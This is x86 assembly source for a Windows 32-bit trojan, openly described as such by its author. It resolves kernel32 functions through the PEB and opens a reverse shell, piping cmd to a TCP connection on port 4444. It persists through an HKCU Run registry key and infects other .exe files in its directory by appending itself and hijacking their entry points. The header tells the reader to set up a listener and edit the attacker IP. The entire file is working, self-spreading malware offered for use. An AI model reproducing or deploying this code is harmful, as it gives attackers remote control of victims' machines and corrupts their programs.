;--------------------------------------------------------------------------------------------------------------------;
; Author: Bach Ngoc Hung (hung.bachngoc@gmail.com)
; Compatible: Windows PE file 32 bits
; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 450)
; Version: 1.0
; This trojan capable of creating backdoor using reverse shell, injecting it self to other PE file.
; It can also add itself to the registry key for persistence.
; The injected file can also infect other files in the directory while avoiding inject to the infected files.
;--------------------------------------------------------------------------------------------------------------------;

.386
Option CaseMap:None

.Code
start:
payload:
	Call get_eip

get_eip:
	Pop Ebx
	delta = $ -payload
	Inc Ebx
	Sub Ebx, delta				; Point ebx back to the entry point of the payload

	Sub Esp, 400H
	Xor Eax, Eax
	Lea Edi, [Ebp - 4H]
	Mov Ecx, 100H
	Std
	Rep Stosd
	Cld

	Mov [Ebp - 108H], Ebx			; This holds the address to the beginning of the payload
	Mov [Ebp - 7CH], Esi
	Mov Ax, 7373H
	Push Eax
	Push 65726464H
	Push 41636F72H
	Push 50746547H
	Mov [Ebp - 14H], Esp			; Push GetProcAddress

	Mov Eax, [Fs:30H]			; PEB
	Mov Eax, [Eax + 0CH]			; PEB_LDR_DATA
	Mov Eax, [Eax + 14H]			; InMemoryOrderModuleList
	Mov Ebx, [Eax + 10H]			;
	Mov [Ebp - 5CH], Ebx			; Store the current executable base address
	Mov Eax, [Eax]				; Get pointer to the second (ntdll.dll) entry in InMemoryOrderModuleList
	Mov Eax, [Eax]				; Get pointer to the third (kernel32.dll) list in InMemoryOrderModuleList
	Mov Eax, [Eax + 10H]
	Mov Ebx, Eax				; Store kernel32.dll base address in ebx

	Mov Eax, [Ebx + 3CH]
	Add Eax, Ebx				; PE signature

	Mov Eax, [Eax + 78H]
	Add Eax, Ebx				; Address of Export Table

	; Get number of exported functions
	Mov Ecx, [Eax + 14H]
	Mov [Ebp - 4H], Ecx

	; Get address of functions
	Mov Ecx, [Eax + 1CH]
	Add Ecx, Ebx
	Mov [Ebp - 8H], Ecx

	; Get address of name table
	Mov Ecx, [Eax + 20H]
	Add Ecx, Ebx
	Mov [Ebp - 0CH], Ecx

	; Get address of ordinal table
	Mov Ecx, [Eax + 24H]
	Add Ecx, Ebx
	Mov [Ebp - 10H], Ecx

	Xor Eax, Eax				; Counter for loop
	Xor Ecx, Ecx

getFunctionPosition:
	Mov Esi, [Ebp - 14H]			; Name of Function
	Mov Edi, [Ebp - 0CH]			; Pointer points to the start of name table
	Mov Edi, [Edi + Eax * 4]		; RVA of next function name
	Add Edi, Ebx

	Mov Cx, 8
	Repe Cmpsb				; Compare edi, esi
	Jz getGetProcAddress			; If found the name then jump to getGetProcAddress
	Inc Eax
	Cmp Eax, [Ebp - 4H]			; Check for if counter < number of functions
	Jne getFunctionPosition ; Loop

; Calculate the ordinal of the function: (Address of ordinal table + position * sizeof(Ordinal))
; After got the ordinal then calculate the RVA of the function address: (RVA AddressOfFunction + ordinal * sizeof(FunctionRVA))
getGetProcAddress:
	Xor Ecx, Ecx
	Mov Ecx, [Ebp - 10H]			; Address of ordinal table
	Mov Edx, [Ebp - 8H]			; Address of function

	Mov Ax, [Ecx + Eax * 2]			; Get the function ordinal
	Mov Eax, [Edx + Eax * 4]
	Add Eax, Ebx				; Function address
	Jmp getFunctionAddress

; Using GetProcAddress to get the address of LoadLibraryA
; This part is used to find necessary libraries and functions
getFunctionAddress:
	Xor Ecx, Ecx
	Xor Edx, Edx
	Mov Esi, Eax				; Move GetProcAddress base to esi
	Mov [Ebp - 14H], Esi			; Saving base address of GetProcAddress
	Push Ecx
	Push 41797261H				; aryA
	Push 7262694CH				; Libr
	Push 64616F4CH				; Load
	Push Esp
	Push Ebx
	Call Esi				; Call GetProcAddress
	Mov [Ebp - 18H], Eax			; Saving LoadLibraryA address

	; Load CreateFileMappingA
	Add Esp, 0CH
	Xor Ecx, Ecx
	Mov Cx, 4167H
	Push Ecx
	Push 6E697070H
	Push 614D656CH
	Push 69466574H
	Push 61657243H
	Push Esp				; "CreateFileMappingA"
	Push Ebx
	Call Esi
	Mov [Ebp - 1CH], Eax			; Saving CreateFileMappingA address

	; Load CreateFile
	Add Esp, 14H
	Push 6141656CH
	Sub DWord Ptr [Esp + 3H], 61H
	Push 69466574H
	Push 61657243H
	Push Esp				; "CreateFileA"
	Push Ebx
	Call Esi				; Call GetProcAddress
	Mov [Ebp - 20H], Eax			; Saving CreateFile address

	; Load FindFirstFileA
	Add Esp, 0CH				; Clear CreateFile from the stack
	Xor Ecx, Ecx
	Mov Cx, 4165H
	Push Ecx
	Push 6C694674H
	Push 73726946H
	Push 646E6946H
	Push Esp 				; "FindFirstFileA"
	Push Ebx				; kernel32.dll base address
	Call Esi				; GetProcAddress
	Mov [Ebp - 24H], Eax			; Saving FindFirstFileA address

	; Get FindNextFileA address
	Add Esp, 10H				; Clear FindFirstFileA from the stack
	Xor Ecx, Ecx
	Mov Cl, 41H
	Push Ecx
	Push 656C6946H
	Push 7478654EH
	Push 646E6946H
	Push Esp
	Push Ebx
	Call Esi				; GetProcAddress
	Mov [Ebp - 28H], Eax			; Saving FindNextFileA base address

	; Load SetFilePointer address
	Add Esp, 10H
	Xor Ecx, Ecx
	Mov Cx, 7265H
	Push Ecx
	Push 746E696FH
	Push 50656C69H
	Push 46746553H
	Push Esp				; "SetFilePointer"
	Push Ebx
	Call Esi				; Call GetProcAddress
	Mov [Ebp - 2CH], Eax			; Saving SetFilePointer address

	; Load WriteFile address
	Add Esp, 10H				; Clear "SetFilePointer"
	Xor Ecx, Ecx
	Mov Cl, 65H
	Push Ecx
	Push 6C694665H
	Push 74697257H
	Push Esp				; "WriteFile"
	Push Ebx
	Call Esi
	Mov [Ebp - 30H], Eax			; Saving WriteFile address

	; Load lstrcpyA address
	Add Esp, 0CH				; Clear WriteFile from the stack
	Xor Ecx, Ecx
	Push Ecx
	Push 41797063H
	Push 7274736CH
	Push Esp 				; "lstrcpyA"
	Push Ebx
	Call Esi				; GetProcAddress
	Mov [Ebp - 34H], Eax			; Saving lstrcpyA base address

	; Load lstrcmpA
	Add Esp, 8H
	Push 41706D63H
	Push 7274736CH
	Push Esp				; "lstrcmpA"
	Push Ebx
	Call Esi
	Mov [Ebp - 38H], Eax			; Saving lstrcmpA base address

	; Load GetModuleFileNameA
	Add Esp, 8H
	Xor Ecx, Ecx
	Mov Cx, 4165H
	Push Ecx
	Push 6D614E65H
	Push 6C694665H
	Push 6C75646FH
	Push 4D746547H
	Push Esp				; "GetModuleFileNameA"
	Push Ebx
	Call Esi
	Mov [Ebp - 3CH], Eax			; Saving GetModuleFileNameA base address

	; Load CreateProcessA
	Add Esp, 0CH
	Xor Ecx, Ecx
	Mov Cx, 4173H
	Push Ecx
	Push 7365636FH
	Push 72506574H
	Push 61657243H
	Push Esp
	Push Ebx
	Call Esi
	Mov [Ebp - 80H], Eax			; Saving CreateProcessA()

	; Load WaitForSingleObject
	Add Esp, 14H
	Xor Ecx, Ecx
	Push Ecx
	Push 61746365H
	Sub DWord Ptr [Esp + 3H], 61H
	Push 6A624F65H
	Push 6C676E69H
	Push 53726F46H
	Push 74696157H
	Push Esp				; WaitForSingleObject
	Push Ebx
	Call Esi
	Mov [Ebp - 84H], Eax			; Saving WaitForSingleObject()

	; Load lstrlenA
	Add Esp, 14H
	Xor Ecx, Ecx
	Push Ecx
	Push 416E656CH
	Push 7274736CH
	Push Esp				; "lstrlenA"
	Push Ebx
	Call Esi
	Mov [Ebp - 40H], Eax

	; Load lstrcatA
	Add Esp, 8H
	Xor Ecx, Ecx
	Push Ecx
	Push 41746163H
	Push 7274736CH
	Push Esp				; "lstrcatA"
	Push Ebx
	Call Esi
	Mov [Ebp - 44H], Eax

	; Load MapViewOfFile
	Add Esp, 8H
	Xor Ecx, Ecx
	Mov Cl, 65H
	Push Ecx
	Push 6C694666H
	Push 4F776569H
	Push 5670614DH
	Push Esp				; "MapViewOfFile"
	Push Ebx
	Call Esi
	Mov [Ebp - 54H], Eax

	; Load ExitProcess
	Add Esp, 10H
	Push 61737365H
	Sub DWord Ptr [Esp + 3H], 61H
	Push 636F7250H
	Push 74697845H
	Push Esp				; "ExitProcess"
	Push Ebx
	Call Esi
	Mov [Ebp - 90H], Eax

	; Load SetEndOfFile
	Add Esp, 0CH
	Push 656C6946H
	Push 664F646EH
	Push 45746553H
	Push Esp				; "SetEndOfFile"
	Push Ebx
	Call Esi
	Mov [Ebp - 74H], Eax

	; The returned data is saved to eax register
	; Load ws2_32.dll using LoadLibraryA
	Mov Eax, [Ebp - 18H]
	Add Esp, 8H				; Clear lstrlenA from the stack
	Xor Ecx, Ecx
	Mov Cx, 6C6CH				; ll
	Push Ecx
	Push 642E3233H				; 32.d
	Push 5F327377H				; ws2_
	Push Esp				; ws2_32.dll
	Call Eax				; Call LoadLibraryA
	Mov Ebx, Eax				; Move ws2_32 base address to ebx

	; Get WSAStartup address
	Add Esp, 0CH				; Clear ws2_32.dll from the stack
	Xor Ecx, Ecx
	Mov Cx, 7075H
	Push Ecx
	Push 74726174H
	Push 53415357H
	Push Esp 				; WSAStartup
	Push Ebx				; ws2_32.dll base address
	Call Esi				; GetProcAddress
	Mov [Ebp - 88H], Eax			; Saving WSAStartup address

	; Get WSASocketA address
	Add Esp, 0CH				; Clear WSAStartup from the stack
	Xor Ecx, Ecx
	Mov Cx, 4174H
	Push Ecx
	Push 656B636FH
	Push 53415357H
	Push Esp
	Push Ebx
	Call Esi				; GetProcAddress
	Mov [Ebp - 8CH], Eax			; Saving WSASocketA base address

	; Get connect() base address
	Add Esp, 0CH				; Clear WSASocketA from the stack
	Xor Ecx, Ecx
	Push Ecx
	Mov Ecx, 61746365H
	Push Ecx
	Sub DWord Ptr [Esp + 3H], 61H
	Push 6E6E6F63H
	Push Esp 				; connect
	Push Ebx				; ws2_32.dll base address
	Call Esi				; GetProcAddress
	Mov [Ebp - 94H], Eax			; Saving connect() base address

	; Load Advapi32.dll using LoadLibraryA
	Mov Eax, [Ebp - 18H]
	Add Esp, 8H				; Clear connect() from the stack
	Push 6C6C642EH
	Push 32336970H
	Push 61766441H
	Push Esp
	Call Eax				; Call LoadLibraryA
	Mov Ebx, Eax				; Moving Advapi32.dll base address to ebx

	; Get RegOpenKeyExA base address
	Add Esp, 0CH				
	Xor Ecx, Ecx
	Push Ecx
	Mov Cl, 41H
	Push Ecx
	Push 78457965H
	Push 4B6E6570H
	Push 4F676552H
	Push Esp
	Push Ebx				; Advapi32.dll base address
	Call Esi				; GetProcAddress
	Mov [Ebp - 98H], Eax			; Saving RegOpenKeyEx base address

	; Get RegSetValueExA base address
	Add Esp, 0CH				; Clearing the stack
	Xor Ecx, Ecx
	Mov Cx, 4178H
	Push Ecx
	Push 4565756CH
	Push 61567465H
	Push 53676552H
	Push Esp 					; RegSetValueEx
	Push Ebx					; Advapi32.dll base address
	Call Esi					; GetProcAddress
	Mov [Ebp - 9CH], Eax		; Saving RegSetValueEx base address

	; Get RegCloseKey base address
	Add Esp, 10H
	Xor Ecx, Ecx
	Mov Edx, [Ebp - 14H]
	Mov Eax, [Ebp - 30H]
	Mov Ecx, 6179654BH
	Push Ecx
	Sub DWord Ptr [Esp + 3H], 61H
	Push 65736F6CH
	Push 43676552H
	Push Esp
	Push Ebx
	Call Esi
	Mov [Ebp - 100H], Eax		; Saving RegCloseKey base address

reverse_shell:
	; System call: WSAStartup
	Xor Edx, Edx
	Xor Ecx, Ecx
	Mov Dx, 190H
	Sub Esp, Edx				; Creating space for WSAData
	Push Esp					; lpWSAData
	Mov Cx, 202H
	Push Ecx
	Mov Eax, [Ebp - 88H]
	Call Eax

	; System call: WSASocketA
	Xor Eax, Eax
	Push Eax					; dwFlags = NULL
	Push Eax					; g = NULL
	Push Eax					; lpProtocolInfo = NULL
	Xor Edx, Edx
	Mov Dl, 6H
	Push Edx					; protocol = 6 = IPPROTO_TCP
	Inc Eax
	Push Eax					; type = 1
	Inc Eax
	Push Eax					; af = 2
	Mov Eax, [Ebp - 8CH]
	Call Eax
	Mov [Ebp - 250H], Eax			; WSASocketA() Handler
	Mov Ebx, [Ebp - 250H]

	; Sytem call: connect
	; connect(SOCKET s, const addr *name, int namelen)
	; listen on port 4444 (0x5C11), IPv4 set to AF_INET (0x0002) => 5C110002
	; listen on all interfaces
	Mov Eax, 0740A8C0H 				; 192.168.64.7
	Push Eax
	Mov Eax, 5C110102H
	Dec Ah						; 5C110102 => 5C110002 (Remove 01)
	Push Eax
	Mov Esi, Esp
	Xor Eax, Eax
	Mov Ax, 10H
	Push Eax					; namelen = 16 bytes
	Push Esi					; *name: 5C110002
	Push Ebx					; Arg 1(s): WSASocketA() Handler
	Mov Eax, [Ebp - 94H]				; connect()
	Call Eax

	; Retrieve the path of the current process
	Xor Eax, Eax
	Xor Ecx, Ecx
	Mov Ax, 64H
	Push Eax					; nSize = 100 bytes
	Lea Eax, [Ebp - 200H]
	Push Eax					; lpFileName
	Push Ecx					; hModule = NULL
	Mov Eax, [Ebp - 3CH]
	Call Eax					; GetModuleFileNameA

SetRegistryKey:
	Xor Ecx, Ecx
	Mov Cl, 6EH
	Push Ecx
	Push 75525C6EH
	Push 6F697372H
	Push 6556746EH
	Push 65727275H
	Push 435C7377H
	Push 6F646E69H
	Push 575C7466H
	Push 6F736F72H
	Push 63694D5CH
	Push 65726177H
	Push 74666F53H
	Mov Edx, Esp					; edx = Pointer to "Software\Microsoft\Windows\CurrentVersion\Run"
	Xor Ecx, Ecx

	; Set hKey with RegOpenKeyExA
	Lea Ebx, [Ebp - 104H]
	Push Ebx						; phkResult
	Push 2H							; samDesired = KEY_SET_VALUE
	Push Ecx						; ulOptions = NULL
	Push Edx						; lpSubkey
	Push 80000001H					; hKey = HKEY_CURRENT_USER
	Mov Eax, [Ebp - 98H]
	Call Eax						; Call RegOpenKeyEx
	Add Esp, 48H					; Clearing the stack

	Mov Eax, [Ebp - 40H]			; Save lstrlenA address to eax
	Lea Edx, [Ebp - 200H]			; Pointer to buffer that stores exe path
	Push Edx
	Call Eax						; Call lstrlenA

	Mov Edi, [Ebp - 104H]			; edi = hKey
	Xor Ecx, Ecx
	Push Ecx						; NULL
	Push 74696873H					; "shit"
	Mov Ebx, Esp					; ebx = Pointer to "shit" string

	; RegSetValueExA
	Lea Edx, [Ebp - 200H]			; Pointer to buffer that stores exe path
	Push Eax						; cbData
	Push Edx						; lpData = pointer to the path of the exe
	Inc Ecx
	Push Ecx						; dwType = REG_SZ
	Dec Ecx
	Push Ecx						; Reserved
	Push Ebx						; lpValueName
	Push Edi						; hKey
	Mov Eax, [Ebp - 9CH]
	Call Eax						; Call RegSetValueExA

	Push Edi
	Mov Eax, [Ebp - 100H]			; Move RegCloseKey address to eax
	Call Eax						; Call RegCloseKey

	; CreateProcessA
	Push 61646D63H
	Sub DWord Ptr [Esp + 3H], 61H
	Mov Edx, Esp					; edx = pointer to "cmd"

	; STARTUPINFO struct
	Mov Ebx, [Ebp - 250H]
	Push Ebx						; SetStdInput to WSASocketA() handler
	Push Ebx						; SetStdOutput to WSASocketA() handler
	Push Ebx						; SetStdError to WSASocketA() handler
	Xor Ebx, Ebx
	Xor Ecx, Ecx
	Add Cl, 12H						; 18

zero_mem_struct:
	Push Ebx						; NULL
	Loop zero_mem_struct			; Push 0x00000000 18 times
	Mov Word Ptr [Esp + 3CH], 101H	; dwFlag (60 bytes from the top of the stack)
	Mov Byte Ptr [Esp + 10H], 44H
	Lea Eax, [Esp + 10H]

	; Calling CreateProcessA
	Push Esp						; Pointer to PROCESS_INFORMATION structure
	Push Eax						; Pointer to STARUPINFOA structure
	Push Ebx
	Push Ebx
	Push Ebx
	Inc Ebx
	Push Ebx						; bInheritAttributes = True
	Dec Ebx
	Push Ebx						; lpThreadAttributes = False
	Push Ebx						; lpProcessAttributes
	Push Edx						; Pointer to cmdline
	Push Ebx						; lpApplicationName
	Mov Eax, [Ebp - 80H]			; Save CreateProcessA address in eax
	Call Eax						; CreateProcessA

	; Calling WaitForSingleObject
	Mov Edx, [Ebp - 84H]			; Save WaitForSingleObject base address to edx
	Mov Eax, Esp					; eax = pointer to PROCESS_INFORMATON structure
	Push Ebx						; dwMiliseconds = 0
	Push Eax
	Call Edx						; Call WaitForSingleObject

	; Retrieve the path of the current process
	Xor Eax, Eax
	Xor Ebx, Ebx
	Mov Ax, 0C8H
	Push Eax					; nSize = 200 bytes
	Lea Eax, [Ebp - 150H]
	Push Eax					; lpFileName
	Push Ebx					; hModule = NULL
	Mov Eax, [Ebp - 3CH]
	Call Eax					; GetModuleFileNameA

	; Copy the path from [ebp - 150H] to [ebp - 200H]
	Lea Eax, [Ebp - 150H]
	Push Eax
	Lea Eax, [Ebp - 200H]
	Push Eax
	Mov Eax, [Ebp - 34H]
	Call Eax					; Call lstrcpyA

	Call find_last_backslash	; Remove the last backslash to get the directory from the path
	Lea Edx, [Ebp - 200H]
	Push Edx					; lpString2
	Lea Ebx, [Ebp - 300H]
	Push Ebx					; lpString1
	Mov Eax, [Ebp - 34H]
	Call Eax					; Call lstrcpyA

	; Find all exe files in the directory
	Mov Eax, [Ebp - 40H]
	Lea Edx, [Ebp - 300H]
	Push Edx
	Call Eax					; Call lstrlenA

	Add Edx, Eax
	Mov Byte Ptr [Edx], 2AH		; "*"
	Inc Edx
	Mov Byte Ptr [Edx], 2EH		; "."
	Inc Edx
	Mov Byte Ptr [Edx], 65H		; "e"
	Inc Edx
	Mov Byte Ptr [Edx], 78H		; "x"
	Inc Edx
	Mov Byte Ptr [Edx], 65H		; "e"
	Inc Edx
	Mov Byte Ptr [Edx], 0H		; null

	Lea Eax, [Ebp - 400H]
	Push Eax
	Lea Eax, [Ebp - 300H]
	Push Eax					; "Path\To\CurrentDirectory\*.exe"
	Mov Eax, [Ebp - 24H]
	Call Eax					; Call FindFirstFileA
	Mov [Ebp - 48H], Eax

process_files_loop:
	; Cut the name of the exe file returned from FindFirstFileA
	; And append it to the current directory using lstrcatA => path to the exe file
	Lea Eax, [Ebp - 400H + 2CH]			; cFileName
	Push Eax					; [in] lpString2 : Name of the exe file
	Lea Eax, [Ebp - 200H]
	Push Eax					; [in, out] lpString1 : This will hold the address of the file for injection
	Mov Eax, [Ebp - 44H]
	Call Eax					; Call lstrcatA

	; Compare the constructed path with the current process path
	Lea Eax, [Ebp - 200H]				; Path to the target exe
	Push Eax
	Lea Eax, [Ebp - 150H]				; Path of the running process
	Push Eax
	Mov Eax, [Ebp - 38H]
	Call Eax					; Call lstrcmpA

	; If identical, skip to next file
	Test Eax, Eax
	Je infect_next_file

	; If not identical, proceed with injecting
	Call InjectingFile

infect_next_file:
	; Move on to the next exe file
	Call find_last_backslash	; Remove the last backslash to get the directory from the path
	Lea Edi, [Ebp - 400H]
	Mov Eax, [Ebp - 48H]		; FindFirstFileA handle
	Push Edi			; LPWIN32_FIND_DATAA
	Push Eax
	Mov Eax, [Ebp - 28H]
	Call Eax			; Call FindNextFileA

	; Check if there are more files to process
	Cmp Eax, 0
	Jne process_files_loop

	; No more file, jump to success
	Jmp exit_success

find_last_backslash:
	; Find the last backslash in the path and null-terminate the string
	Xor Edx, Edx
	Mov Eax, [Ebp - 40H]		; Load lstrlenA address to eax
	Lea Edx, [Ebp - 200H]		; Path to the current exe
	Push Edx
	Call Eax                    	; Size of the path => eax
	Add Edx, Eax                	; Point edx to the end of the string
	Dec Edx

find_backslash_loop:
	Cmp Byte Ptr [Edx], 5CH     	; 5C = "\"
	Je found_backslash		; If found then jump to next step
	Dec Edx				; Else, keep decreasing until the "\" is found
	Jmp find_backslash_loop		; Loop

found_backslash:
	Mov Byte Ptr [Edx + 1H], 0H ; Null-terminate the string at the last backslash
	Ret

InjectingFile:
	Xor Ecx, Ecx
	Xor Eax, Eax
	Xor Edx, Edx
	Lea Eax, [Ebp - 200H]
	Push Ecx					; hTemplatefile (NULL)
	Push Ecx					; dwFlagsAndAttributes (NULL)
	Push 3H						; dwCreationDisposition (OPEN_EXISTING)
	Push Ecx					; lpSecurityAttributes (NULL)
	Push 1H						; dwShareMode (FILE_SHARE_READ)
	Push 0C0000000H					; dwDesiredAccess (GENERIC_WRITE or GENERIC_READ)
	Push Eax					; lpFilePath
	Mov Eax, [Ebp - 20H]
	Call Eax					; Call CreateFileA
	Cmp Eax, 0FFFFFFFFH				; Check if handle is valid

	Je exit						; If the handle is invalid => jump to exit
	Mov [Ebp - 4CH], Eax				; Store the file handle
	Push Eax					; Map the file into the memory

	Xor Edx, Edx
	Push Edx					; NULL
	Push Edx					; 0
	Push Edx					; 0
	Push 4H						; PAGE_READWRITE
	Push Edx					; lpFileMappingAttributes = 0
	Push Eax					; fileHandle
	Mov Eax, [Ebp - 1CH]
	Call Eax					; Call CreateFileMappingA

	; Check if mapping handle is valid
	Cmp Eax, Ecx
	Je exit
	Mov [Ebp - 50H], Eax				; Store mapping handle
	Mov Ecx, Eax

	; Get the address of the mapped file
	Xor Ebx, Ebx
	Push Ebx
	Push Ebx
	Push Ebx
	Push 2H						; dwDesiredAccess = FILE_MAP_WRITE
	Push Ecx
	Mov Eax, [Ebp - 54H]
	Call Eax					; Call MapViewOfFile

	; Check if mapping address is valid
	Cmp Eax, Ebx
	Je exit
	Mov Ebx, Eax				; Base address of the infected file
	Mov [Ebp - 58H], Eax			; Save the base address

	Mov Eax, [Eax + 34H]
	Cmp Eax, 0				; Checking if the file has been infected or not
	Jnz infect_next_file			; If it's infected, move to next file

	Mov Edi, [Ebx + 3CH]
	Add Edi, Ebx				; PE signature

	Mov Eax, [Edi + 3CH]
	Mov [Ebp - 64H], Eax			; FileAlignment

	Mov Eax, [Edi + 38H]
	Mov [Ebp - 68H], Eax			; SectionAlignment

	Mov Eax, [Edi + 28H]			; AddressOfEntryPoint
	Mov Edx, [Edi + 34H]			; ImageBase
	Add Eax, Edx				; Jump back entry point

	Mov [Ebx + 34H], Eax			; Tell the injected file where the jump back entry point is

	Mov Eax, [Edi + 50H]
	Mov [Ebx + 30H], Eax			; Save SizeOfImage for backup later
	Mov [Ebp - 60H], Eax			; SizeOfImage

	Mov Ax, [Edi + 6H]			; Number of section
	Add Edi, 0F8H				; Skip through Optional Header
	Sub Ax, 1
	Mov Dx, 40
	IMul Ax, Dx
	Movzx Eax, Ax
	Add Edi, Eax				; Move to the last section info in section table
	Mov [Ebp - 4H], Edi			; Save the address of the section table for later use

	; Calculate new virtual size of the last section
	; and distance to move to inject the payload
	Mov Eax, [Edi + 8H]			; Move to the last section virtual size
	Mov [Ebx + 2CH], Eax		; Save virtual size for backup later
	Mov Edx, [Edi + 14H]		; Move to last section raw address
	Add Edx, Eax
	Mov [Ebp - 70H], Edx		; Save the distance to move for the payload injection

	Mov Edx, PayloadSize
	Add Eax, Edx
	Mov [Edi + 8H], Eax
	Mov [Ebp - 68H], Eax		; Update virtual Size
	Mov Esi, [Ebp - 4CH]		; esi = fileHandle
	Mov Ebx, [Ebp - 30H]		; ebx = address of WriteFile

	; Calculate new raw size of the last section
	Mov Eax, [Edi + 10H]		; Move to last section raw size
	Mov [Ebx + 38H], Eax		; Save RawSize for backup later
	Mov Edx, PayloadSize
	Add Eax, Edx
	Mov Edx, [Ebp - 64H]		; FileAlignment
	Dec Edx
	Add Eax, Edx
	Not Edx
	And Eax, Edx
	Mov [Edi + 10H], Eax		; Update new raw size of the last section

	Mov Eax, [Edi + 24H]
	Mov [Ebx + 28H], Eax		; Save the current Characteristics for backup later
	Or Eax, 60000020H		; IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE
	Mov [Edi + 24H], Eax		; Update last section characteristics

	; Calculate new AddressOfEntryPoint = VirtualAddress + VirtualSize - PayloadSize
	Mov Eax, [Edi + 0CH]		; VirtualAdress
	Mov Ecx, [Ebp - 68H]		; VirtualSize
	Add Eax, Ecx
	Mov Ecx, PayloadSize
	Sub Eax, Ecx

	Mov Edi, [Ebp - 58H]		; Base address
	Add Edi, [Edi + 3CH]		; Move back to PE signature
	Mov [Edi + 28H], Eax		; Update new AddressOfEntryPoint

	; Calculate new SizeOfImage and roundit up with section alignment
	Mov Eax, [Edi + 50H]		; eax = offset of SectionAlignment
	Mov Edx, PayloadSize
	Dec Eax
	Add Edx, Eax
	Not Eax
	And Edx, Eax
	Mov Eax, [Ebp - 60H]		; eax = SizeOfImage
	Add Edx, Eax
	Mov [Edi + 50H], Edx		; Update new SizeOfImage

	; Injecting the payload
	Mov Edx, [Ebp - 70H]		; Load distance to move to edx
	Mov Eax, [Ebp - 2CH]		; Load SetFilePointer address to eax
	Xor Ecx, Ecx
	Push Ecx					; FILE_BEGIN
	Push Ecx					; NULL
	Push Edx
	Push Esi					; FileHandle
	Call Eax					; Call SetFilePointer

	Lea Eax, [Ebp - 6CH]
	Xor Ecx, Ecx
	Push Ecx					; lpOverlapped = NULL
	Push Eax					; lpNumberOfBytesWritten
	Mov Eax, PayloadSize
	Push Eax
	Mov Edx, [Ebp - 108H]				; Load payload base address to edx
	Lea Eax, [Edx]					; Point eax to the beginning of the payload
	Push Eax					; lpBuffer
	Push Esi					; FileHandle
	Call Ebx					; Call WriteFile

	; Set end of file
	Xor Ebx, Ebx
	Mov Ecx, [Ebp - 4H]			; Load the address of the section table to edi
	Mov Eax, [Ecx + 10H]		; Move to the last section raw size
	Mov Edx, [Ecx + 14H]		; Move to last section raw address
	Add Edx, Eax
	Push Ebx					; FILE_BEGIN
	Push Ebx					; NULL
	Push Edx
	Push Esi					; FileHandle
	Mov Eax, [Ebp - 2CH]		; Load SetFilePointer address to eax
	Call Eax					; Call SetFilePointer

	Mov Eax, [Ebp - 74H]		; Load SetEndOfFile address to eax
	Push Esi					; FileHandle
	Call Eax					; Call SetEndOfFile
	Jmp infect_next_file

exit:
	Mov Eax, [Ebp - 90H]
	Push Ebx					; 0
	Call Eax					; ExitProcess

exit_success:
	Mov Edi, [Ebp - 5CH]		; Load current file base address to edi
	Mov Eax, [Edi + 34H]		; Load jump back entry point to eax
	Cmp Eax, 0					; If nothing is written there => exit
	Je exit
	Push Eax
	Ret

PayloadSize = $ -payload

End start
